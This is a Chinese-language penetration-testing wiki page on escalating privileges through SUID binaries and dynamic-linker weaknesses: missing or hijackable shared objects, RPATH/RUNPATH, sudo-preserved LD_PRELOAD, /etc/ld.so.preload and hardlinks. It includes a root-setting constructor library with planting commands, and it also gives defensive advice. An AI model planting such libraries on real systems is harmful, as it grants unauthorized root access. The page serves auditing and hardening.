# SUID Shared Library 和 Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

SUID binaries 通常会针对直接命令执行进行审查，但 custom SUID programs 也可能通过 dynamic linker 存在漏洞。其常见模式很简单：一个 privileged executable 从低权限用户可以影响的路径或 configuration 中加载代码。<sup>[[1]](#references)</sup>

本页面重点介绍通用的 technique patterns：缺失的 libraries、可写的 library directories、`RPATH`/`RUNPATH`、通过 sudo 使用 `LD_PRELOAD`、linker configuration，以及 SUID hardlink confusion。

## 快速枚举

首先查找异常的 SUID files，并检查它们是否为 dynamically linked：<sup>[[1]](#references)[[3]](#references)</sup>
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
关注非标准位置、自定义应用程序路径、由 root 所有但位于软件包管理目录之外的二进制文件，以及从可写目录加载的依赖项。<sup>[[1]](#references)</sup>

有用的可写性检查：
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## 缺失的 Shared Object 注入

一些自定义 SUID binaries 会尝试加载不存在的 shared object。如果缺失路径位于攻击者控制的目录下，该 binary 可能会以 effective user 身份加载攻击者提供的代码。<sup>[[1]](#references)</sup>

使用 `strace` 的 syscall filter 查找失败的 library lookup：<sup>[[2]](#references)</sup>
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
如果该 binary 会在可写路径中搜索 `libexample.so`，则可以使用 constructor 编写一个最小化的 proof library。在验证期间，应确保 proof-of-impact 保持无害：<sup>[[6]](#references)</sup>
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
使用 binary 尝试加载的确切文件名构建它：
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
可利用的条件并不只是缺少 library。攻击者还必须能够将兼容的 shared object 放置到特权 loader 会接受的路径中。<sup>[[1]](#references)</sup>

## 可写 Library 目录

有时所有依赖项都存在，但用于解析这些依赖项的某个目录具有写权限。这可能允许替换已加载的 library，或植入一个具有相同名称但优先级更高的 library。<sup>[[1]](#references)</sup>

检查依赖项路径：<sup>[[1]](#references)[[3]](#references)</sup>
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
如果该目录可写，请在 lab 中使用可安全复制的方法进行验证。在运行中的主机上替换系统 libraries，可能会导致同时启动的进程使用版本不一致的 library。<sup>[[8]](#references)</sup>

## RPATH and RUNPATH

`RPATH` 和 `RUNPATH` 是 dynamic-section 条目，用于告知 loader 在哪里搜索 libraries。当它们指向 attacker 可写的目录时，在 SUID 程序中会带来危险。<sup>[[1]](#references)</sup>

检测它们：<sup>[[3]](#references)[[10]](#references)</sup>
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
示例风险输出：
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
如果 `/opt/app/lib` 可写且该 binary 需要 `libcustom.so`，攻击者可能能够在其中放置恶意的 `libcustom.so`：<sup>[[1]](#references)</sup>
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` 和 `RUNPATH` 在所有解析细节上并不完全相同，但对于 privilege-escalation review，实际问题是相同的：SUID binary 是否会在 attacker-writable directory 中搜索某个 library name？<sup>[[1]](#references)</sup>

## LD_PRELOAD、LD_LIBRARY_PATH 和 SUID

对于普通程序，`LD_PRELOAD` 和 `LD_LIBRARY_PATH` 可以强制或影响 shared object loading。对于 SUID 程序，dynamic loader 通常会进入 secure-execution mode，并忽略危险的 environment variables。<sup>[[1]](#references)</sup>

这意味着，普通 SUID binary 通常不会仅仅因为用户可以设置 `LD_PRELOAD` 就存在 vulnerability：<sup>[[1]](#references)</sup>
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
常见的例外是：sudo policy 允许为目标命令设置或保留 loader variables。检查 `sudo -l` 的输出，查找诸如 `env_keep+=LD_PRELOAD` 或 `env_keep+=LD_LIBRARY_PATH` 的条目；如果目标是动态链接的，它可能会加载攻击者控制的代码：<sup>[[4]](#references)[[5]](#references)</sup>
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
不要混淆这些情况；上面的 loader 和 sudo policy rules 对它们进行了区分：<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- 针对普通 SUID binary 使用 `LD_PRELOAD`：通常会被 secure execution 阻止。
- 被 sudo 保留的 `LD_PRELOAD`：可能存在 exploitable 风险。
- 可写路径中缺失的 `.so`：当 SUID binary 自然加载该路径时可被利用。
- 指向可写目录的 `RPATH`/`RUNPATH`：当所需 library 可被控制时可被利用。
- `/etc/ld.so.preload` 或 linker config 的写入权限：影响整个系统，风险很高。

## Linker Configuration

`ld.so` 使用 linker cache 和 `/etc/ld.so.preload`；`ldconfig` 根据 `/etc/ld.so.conf` 及其包含的文件构建该 cache，这些文件通常位于 `/etc/ld.so.conf.d/`。<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

高价值检查：
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
可写的 linker 配置通常比单个存在漏洞的 SUID binary 更严重，因为它可能影响许多 dynamically linked processes。`/etc/ld.so.preload` 尤其危险，因为它可以将 shared object 强制加载到 privileged processes 中。<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## SUID Hardlink Confusion

Hardlinks 可以让同一个 SUID inode 以多个名称出现。<sup>[[9]](#references)</sup>这对于隐藏 privileged helper、干扰清理操作或绕过简单的基于路径的审查很有用。

查找具有多个链接的 SUID 文件：<sup>[[9]](#references)</sup>
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
检查指向同一 inode 的所有路径：<sup>[[9]](#references)</sup>
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
这种 abuse 并不是 hardlink 会更改权限，而是 path confusion：特权 inode 可能通过一个 defenders 或 scripts 未预期的名称被访问。<sup>[[9]](#references)</sup> 如需深入了解 inode 和 hardlink workflow，请参阅 [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md)。

## 防御说明

- 尽可能保持 SUID binaries 精简、经过审计并由 package 管理。
- 避免将 `RPATH`/`RUNPATH` 指向可写或由 application 管理的目录。<sup>[[1]](#references)[[8]](#references)</sup>
- 确保 library directories 由 root 所有，且 regular users 不可写入。<sup>[[8]](#references)</sup>
- 不要通过 sudo 保留 `LD_PRELOAD`、`LD_LIBRARY_PATH` 或类似的 loader variables。<sup>[[1]](#references)[[5]](#references)</sup>
- 监控 `/etc/ld.so.preload`、`/etc/ld.so.conf`、`/etc/ld.so.conf.d/` 以及异常的 SUID files。<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- 检查 hardlinked SUID files，并调查 standard system paths 之外的 custom SUID wrappers。<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — Linux 手册页](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf（GNU Binary Utilities）](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — Linux 手册页](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — Linux 手册页](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Common Attributes（GCC）](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Dynamic Linker Hardening（The GNU C Library）](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hard Links（GNU Findutils）](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump（GNU Binary Utilities）](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
{{#include ../../banners/hacktricks-training.md}}
